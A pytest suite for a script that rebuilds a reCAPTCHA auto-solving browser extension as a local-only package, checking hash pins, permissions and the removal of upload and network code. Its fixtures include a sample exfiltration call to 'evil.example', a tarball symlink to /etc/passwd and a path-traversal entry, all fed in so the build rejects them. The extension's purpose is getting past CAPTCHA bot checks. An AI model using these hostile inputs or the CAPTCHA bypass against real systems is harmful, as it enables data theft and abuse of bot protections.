import hashlib
import importlib.util
import io
import json
import tarfile
from pathlib import Path

import pytest

_SCRIPT = Path(__file__).resolve().parents[1] / "scripts" / "captcharaptor" / "build_extension.py"


def _load():
    spec = importlib.util.spec_from_file_location("build_extension", _SCRIPT)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


be = _load()

RECAPTCHA_JS = (
    "function incStep() {\n  window.__recaptchaSteps = (window.__recaptchaSteps || 0) + 1;\n\n"
    + be.STEP_BROADCAST
    + "\n"
    + be.STEP_EVENT
    + "  window.postMessage({ source: 'captcharaptor' });\n}\n"
)
LOADER_JS = f'addEventListener("message", m => {{ let d = m.data; {be.LOADER_LISTENER} || i(d) }});\n'


def _files(override=None):
    files = {p: f"// {p}\n".encode() for p in be.COPY}
    files["extension/captcha/recaptcha.js"] = RECAPTCHA_JS.encode()
    files["extension/eventhook/loader.js"] = LOADER_JS.encode()
    files["extension/captcha/recaptcha_ai.js"] = b"const c = new OffscreenCanvas(1, 1);\n"
    files["extension/icon/16.png"] = b"\x89PNG tEXt http://imagemagick.org"
    files["extension/uploader.js"] = b"const UPLOAD_URL = 'https://captcharaptor.com/upload.php';\n"
    files.update(override or {})
    return files


def _tarball(tmp_path, files, extra=None, root=be.ROOT):
    path = tmp_path / "up.tar.gz"
    with tarfile.open(path, "w:gz") as tar:
        for name, data in files.items():
            info = tarfile.TarInfo(f"{root}/{name}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        for info in extra or []:
            tar.addfile(info)
    return path


@pytest.fixture
def pinned(monkeypatch):
    def pin(path):
        monkeypatch.setattr(be, "TARBALL_SHA256", hashlib.sha256(path.read_bytes()).hexdigest())
        with tarfile.open(path, "r:gz") as tar:
            pins = {m.name.split("/", 1)[1]: hashlib.sha256(tar.extractfile(m).read()).hexdigest()
                    for m in tar.getmembers() if m.isfile()}
        monkeypatch.setattr(be, "FILE_SHA256", {p: pins.get(p, "") for p in be.COPY})
        return path
    return pin


def test_builds_a_local_only_extension(tmp_path, pinned):
    tar = pinned(_tarball(tmp_path, _files()))
    dest = tmp_path / "out"
    be.build(tar, dest)
    names = {str(p.relative_to(dest)) for p in dest.rglob("*") if p.is_file()}
    assert "uploader.js" not in names and "popup.html" not in names
    assert {"manifest.json", "background.js", "rules/hl_en.json", "BUILD-INFO.txt", "LICENSE"} <= names
    m = json.loads((dest / "manifest.json").read_text())
    assert m["host_permissions"] == be.RECAPTCHA_MATCHES
    assert m["permissions"] == ["declarativeNetRequest"]
    assert all(cs["matches"] == be.RECAPTCHA_MATCHES for cs in m["content_scripts"])
    war = m["web_accessible_resources"][0]["matches"]
    assert war == be.RECAPTCHA_ORIGINS
    assert all(u.split("://", 1)[1].index("/") == len(u.split("://", 1)[1]) - 2 for u in war)  # origin + /*
    assert "connect-src 'self'" in m["content_security_policy"]["extension_pages"]
    assert "action" not in m
    script = (dest / "captcha/recaptcha.js").read_text()
    assert "window.top.postMessage" not in script and "CustomEvent" not in script
    assert "__recaptchaSteps" in script and "window.postMessage" in script
    assert "m.source !== window ||" in (dest / "eventhook/loader.js").read_text()
    info = (dest / "BUILD-INFO.txt").read_text()
    digest = hashlib.sha256((dest / "background.js").read_bytes()).hexdigest()
    assert f"{digest}  background.js" in info


def test_background_has_fixed_settings_and_no_network():
    js = (_SCRIPT.parent / "background.js").read_text()
    assert "recaptcha_auto_open: true" in js and "recaptcha_auto_solve: true" in js
    for word in ("fetch(", "XMLHttpRequest", "WebSocket", "storage", "alarms", "idle", "indexedDB"):
        assert word not in js
    be.check({"background.js": js.encode()})


def test_wrong_tarball_hash_fails(tmp_path):
    with pytest.raises(be.BuildError, match="does not match"):
        be.build(_tarball(tmp_path, _files()), tmp_path / "out")
    assert not (tmp_path / "out").exists()


@pytest.mark.parametrize("text", [
    "fetch('https://captcharaptor.com/x')",
    "importScripts('uploader.js')",
    "new WebSocket(u)",
    "chrome.offscreen.createDocument()",
    "navigator.sendBeacon(u)",
    "fetch('https://evil.example/collect')",
])
def test_reporting_or_foreign_url_in_output_fails(tmp_path, pinned, text):
    tar = pinned(_tarball(tmp_path, _files({"extension/captcha/recaptcha_ai.js": text.encode()})))
    with pytest.raises(be.BuildError, match="local-only check"):
        be.build(tar, tmp_path / "out")
    assert not (tmp_path / "out").exists()


def test_recaptcha_urls_and_offscreen_canvas_pass():
    be.check({
        "a.js": b"x='https://www.google.com/recaptcha/api2/anchor'; new OffscreenCanvas(1,1);",
        "b.png": b"https://imagemagick.org",
    })


@pytest.mark.parametrize("kind", ["symlink", "traversal"])
def test_unsafe_tarball_entries_fail(tmp_path, pinned, kind):
    if kind == "symlink":
        info = tarfile.TarInfo(f"{be.ROOT}/extension/link")
        info.type, info.linkname = tarfile.SYMTYPE, "/etc/passwd"
    else:
        info = tarfile.TarInfo(f"{be.ROOT}/../escape.js")
    tar = pinned(_tarball(tmp_path, _files(), extra=[info]))
    with pytest.raises(be.BuildError, match="unsafe path|link or special"):
        be.build(tar, tmp_path / "out")


def test_missing_step_broadcast_fails(tmp_path, pinned):
    tar = pinned(_tarball(tmp_path, _files({"extension/captcha/recaptcha.js": b"function incStep() {}\n"})))
    with pytest.raises(be.BuildError, match="patch target not found"):
        be.build(tar, tmp_path / "out")


def test_missing_allowlisted_file_fails(tmp_path, pinned):
    files = _files()
    del files["extension/models/grid.onnx"]
    with pytest.raises(be.BuildError, match="missing from tarball"):
        be.build(pinned(_tarball(tmp_path, files)), tmp_path / "out")


def test_rebuild_replaces_the_previous_output(tmp_path, pinned):
    tar = pinned(_tarball(tmp_path, _files()))
    dest = tmp_path / "out"
    be.build(tar, dest)
    (dest / "stale.js").write_text("old")
    be.build(tar, dest)
    assert not (dest / "stale.js").exists()


def test_refuses_to_replace_a_folder_that_is_not_a_build(tmp_path, pinned):
    dest = tmp_path / "Desktop"
    dest.mkdir()
    (dest / "keep.txt").write_text("mine")
    with pytest.raises(be.BuildError, match="not an earlier build"):
        be.build(pinned(_tarball(tmp_path, _files())), dest)
    assert (dest / "keep.txt").read_text() == "mine"


def test_a_changed_upstream_file_fails_the_pin_check(tmp_path, pinned, monkeypatch):
    tar = pinned(_tarball(tmp_path, _files()))
    monkeypatch.setitem(be.FILE_SHA256, "extension/lib/sql-wasm.wasm", "0" * 64)
    with pytest.raises(be.BuildError, match="differ from the reviewed pins: extension/lib/sql-wasm.wasm"):
        be.build(tar, tmp_path / "out")


def test_pins_cover_exactly_the_copied_files():
    assert set(be.FILE_SHA256) == set(be.COPY) and all(len(h) == 64 for h in be.FILE_SHA256.values())
